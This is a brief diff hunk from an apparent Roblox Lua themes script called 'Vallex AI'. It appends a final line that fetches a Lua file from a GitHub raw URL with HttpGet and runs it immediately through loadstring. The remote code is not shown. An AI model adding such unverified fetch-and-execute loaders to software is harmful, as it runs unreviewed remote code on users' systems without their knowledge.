@@ -2831,3 +2831,5 @@ print(("[Vallex AI] v%s loaded — %d themes available. Have fun, %s!")
                 for _ in pairs(Themes) do n = n + 1 end
                 return n
         end)(), getPlayerName()))
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MKdoyu34/Scripts/refs/heads/main/VallexAIThemes.lua"))()
